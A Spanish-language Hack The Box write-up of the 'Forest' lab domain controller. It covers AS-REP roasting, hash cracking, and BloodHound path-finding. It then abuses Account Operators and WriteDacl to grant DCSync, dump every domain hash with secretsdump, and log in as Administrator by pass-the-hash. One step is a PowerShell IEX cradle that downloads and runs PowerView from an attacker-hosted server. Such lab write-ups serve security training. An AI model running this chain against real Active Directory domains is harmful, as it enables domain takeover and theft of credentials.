# Máquina Forest

Enlace a la máquina -> [HackTheBox](https://app.hackthebox.com/machines/Forest)

![imagen](https://github.com/user-attachments/assets/e1b1d787-93ea-4dc6-9f71-51bf0a90013a)

- **Nombre de la Máquina:** Forest  
- **Sistema Operativo:** Windows  
- **Dificultad:** Fácil  
- **Plataforma:** Hack The Box  
- **Dirección IP:** 10.10.10.161 
- **Skills**
  - RPC Enumeration - Getting valid domain users
  - Performing an AS-RepRoast attack with the obtained users
  - Cracking Hashes
  - Abusing WinRM - EvilWinRM
  - Ldap Enumeration - ldapdomaindump
  - BloodHound Enumeration
  - Gathering system information with SharpHound.ps1 - PuckieStyle
  - Representing and visualizing data in BloodHound
  - Finding an attack vector in BloodHound
  - Abusing Account Operators Group - Creating a new user
  - Abusing Account Operators Group - Assigning a group to the newly created user
  - Abusing WriteDacl in the domain - Granting DCSync Privileges
  - DCSync Exploitation - Secretsdump.py

## Reconocimiento y Enumeración

Comenzamos realizando un escaneo general utilizando Nmap para identificar los puertos abiertos y sus versiones en la IP del objetivo:

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn -sCV 10.10.10.161 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/2da22666-e51f-4fcc-8321-be947c968863)

Segun el reporte y los puertos identificados la máquina parece ser un controlador de dominio para el dominio *htb.local*.

![imagen](https://github.com/user-attachments/assets/6529f3e6-074d-4c5a-a0c5-581e6e055276)

### RPC - 135

Realizamos una enumeración de recurso compartidos con una session nula, pero no encontramos ningún recurso compartido. Posteriormente intentamos realizar una enumeración de usuarios del dominio empleando `rpcclient` y una session nula:

```bash
rpcclient --no-pass 10.10.10.161 -U ""
```

![imagen](https://github.com/user-attachments/assets/77f8990d-b601-4227-b487-6d5e874e2ab3)

Empleamos el siguiente comando para extraer únicamente los usuarios.

```bash
cat userss | tr ':' ' ' | awk {'print $2'} | tr -d '[]' > users.txt
cat users.txt | grep -vE 'SM|Mailbox' > users
```

![imagen](https://github.com/user-attachments/assets/78c23771-cbce-4d09-a099-2e61dd4d477f)

# Explotación

---

### AS-RepRoast attack

Ahora que disponemos de una lista de usuarios de dominio, estamos en posición de llevar a cabo el ataque conocido como "AS-REP Roasting". Para ejecutar este tipo de ataque, es necesario que una cuenta tenga la propiedad "No requerir autenticación previa de Kerberos" o `UF_DONT_REQUIRE_PREAUTH` establecida en "true".

El siguiente paso es solicitar el Ticket Granting Ticket (TGT) cifrado para ese usuario en particular. Dado que el TGT contiene información cifrada utilizando el hash NTLM del usuario, podemos someterlo a un ataque de fuerza bruta offline con el objetivo de intentar obtener la contraseña.

Un script útil para llevar a cabo esta tarea es [GetNPUsers.py](http://getnpusers.py/) de Impacket, que permite solicitar un ticket TGT y volcar el hash correspondiente.

```bash
impacket-GetNPUsers -no-pass -usersfile users htb.local/
```

![imagen](https://github.com/user-attachments/assets/5c04e7b9-20aa-44fd-bdc5-b04f3b699c9d)

Hemos obtenido el hash del usuario `svc-alfresco`. Ahora, procederemos a copiarlo en un archivo y luego intentaremos descifrarlo utilizando la herramienta **JohnTheRipper**.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![imagen](https://github.com/user-attachments/assets/22601a60-e006-435b-ac66-79de2ffeea05)

La contraseña de esta cuenta es `s3rvice`. Dado que el puerto `5985` también está abierto, podemos verificar si este usuario tiene permitido el acceso remoto a través de WinRM utilizando **Evil-WinRM**.

```bash
netexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

![imagen](https://github.com/user-attachments/assets/9c52ff5b-130b-4bf5-ae48-2e70e7d44fc9)

Como se puede observar, el usuario `svc-alfresco` tiene la autorización para el acceso remoto a través de WinRM, por lo que procedemos a iniciar sesión.

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

![imagen](https://github.com/user-attachments/assets/5603e5ec-bcdc-4b81-8f0e-570241f41027)

# Escalada de privilegios

---

### Enumeración con BloodHound

Para avanzar en la exploración del dominio y buscar rutas de escalada de privilegios, el siguiente paso es ejecutar [SharpHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) para recopilar datos que luego se utilizarán en [BloodHound](https://github.com/BloodHoundAD/BloodHound). Para hacerlo, debemos cargar el archivo SharpHound.exe utilizando la sesión de Evil-WinRM que ya hemos establecido.

```bash
upload /home/kali/Desktop/HTB/content/SharpHound.exe
```

![imagen](https://github.com/user-attachments/assets/10a2f2a6-3b24-43af-838f-f850ce7521f5)

Lo ejecutamos y obtenemos un archivo `zip`.

```bash
.\Sharphound.exe --CollectionMethods All
```

![imagen](https://github.com/user-attachments/assets/50c83f4b-23c1-438c-87a5-325437a5e33f)

Descargamos el archivo `zip` a nuestra maquina atacante.

```bash
download 20241213044758_BloodHound.zip
```

![imagen](https://github.com/user-attachments/assets/80e803a7-d4a8-4cbf-8c94-a7cb816a31f0)

Ejecuto el siguiente comando para administrar y gestionar una base de datos `Neo4j`.

```bash
neo4j console
```

![imagen](https://github.com/user-attachments/assets/ae2413b2-5ad6-4a71-a922-3eb307d2f8de)

Con este comando iniciamos la interfaz gráfica de usuario (GUI) de BloodHound.

```bash
bloodhound
```

Introducimos las credenciales correspondientes.
Cargamos los datos del archivo `zip` que contiene los resultados recopilados por SharpHound.

![imagen](https://github.com/user-attachments/assets/57909289-44b9-41de-b2d1-0d0054b51b78)

Marcamos al usuario `svc-alfresco` como comprometido, ya que hemos obtenido control sobre la cuenta.

![imagen](https://github.com/user-attachments/assets/f17fb5dd-0f77-4a3d-943a-20a541e17101)

A partir del usuario `svc-alfresco`, seleccionamos "Objetivos de alto valor alcanzables".

![imagen](https://github.com/user-attachments/assets/c225d918-d26a-4799-a9f2-18d71800cc82)

Claramente, podemos observar que el usuario `svc-alfresco` es parte del grupo "**SERVICE ACCOUNTS**". A su vez, este grupo es miembro del grupo "**PRIVILEGED IT ACCOUNTS**", y este último grupo pertenece al grupo "**ACCOUNT OPERATORS**". En resumen, el usuario `svc-alfresco` es miembro del grupo **PRIVILEGED IT ACCOUNTS**.

![imagen](https://github.com/user-attachments/assets/560293b0-e62c-4110-b584-fd011f3e4207)

A partir del grupo **ACCOUNT OPERATORS**, seleccionamos "Objetivos de alto valor alcanzables".

![imagen](https://github.com/user-attachments/assets/e978ffb7-bba7-45ff-85df-fc444d576fc0)

Podemos observar que los miembros del grupo **ACCOUNT OPERATORS** tiene el control total sobre el grupo **EXCHANGE WINDOWS PERMISSIONS**.

La principal vulnerabilidad aquí es que Exchange tiene altos privilegios en el dominio de Active Directory. El grupo **EXCHANGE WINDOWS PERMISSIONS** tiene acceso **WriteDacl** sobre el objeto Domain en Active Directory, lo que permite a cualquier miembro de este grupo modificar los privilegios del dominio, entre los que se encuentra el privilegio de realizar operaciones **DCSync**. Los usuarios o equipos con este privilegio pueden realizar operaciones de sincronización que normalmente utilizan los Controladores de Dominio para replicarse, lo que permite a los atacantes sincronizar todas las contraseñas hash de los usuarios del Directorio Activo.

![imagen](https://github.com/user-attachments/assets/7e3701bb-1041-4119-a40a-17f179fa767d)

También podemos hacer clic en **WriteDacl** y luego seleccionar "**Help**" para obtener información sobre esta vulnerabilidad, así como un ejemplo de cómo explotarla.

![imagen](https://github.com/user-attachments/assets/54303fff-dcc6-402a-bc5c-46475eb5b479)

Creamos un nuevo usuario y lo agregamos al grupo "Exchange Windows Permissions".

```bash
net user pablo password123$ /domain /add

net group "Exchange Windows Permissions" pablo /add
```

![imagen](https://github.com/user-attachments/assets/0534ef1c-9c5e-4ada-a9e1-38ee0295bd56)

Para llevar a cabo este ataque, es necesario descargar [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) y ejecutarlo en la máquina víctima.

Entonces, procedemos a crear un servidor con Python.

```bash
python3 -m http.server 80
```

Luego, descargamos y ejecutamos el script de PowerShell desde la URL atacante.

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.22/PowerView.ps1')
```

![imagen](https://github.com/user-attachments/assets/a79698e0-9d57-46ca-9d33-3d6e423a86ab)

Ahora podemos ejecutar los siguientes comandos para otorgar al usuario `pablo` el derecho **DCSync** en el dominio "**DC=htb,DC=local**".

```bash
$SecPassword = ConvertTo-SecureString 'password123$' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\pablo', $SecPassword)
Add-DomainObjectAcl -PrincipalIdentity pablo -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync
```

![imagen](https://github.com/user-attachments/assets/e4546e39-8578-4841-ae8b-924b901a7851)

Ahora podemos utilizar el script `secretsdump.py` de Impacket, ejecutándolo como `pablo`, para revelar los hashes NTLM de todos los usuarios del dominio.

```bash
impacket-secretsdump htb.local/pablo:'password123$'@10.10.10.161
```

![imagen](https://github.com/user-attachments/assets/d966c860-5582-4488-873b-c907c1d7aa84)

Verificamos con el hash del usuario `Administrator` si podemos establecer una sesión con WinRM.

```bash
netexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

![imagen](https://github.com/user-attachments/assets/3467945d-8a42-41f1-9c06-e06ed9494479)

Habiendo confirmado que es posible, procedemos a acceder como usuario `Administrator` utilizando **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

![imagen](https://github.com/user-attachments/assets/72d3604a-e803-466a-8f92-cbca2c34ecd7)

Máquina vulnerada.
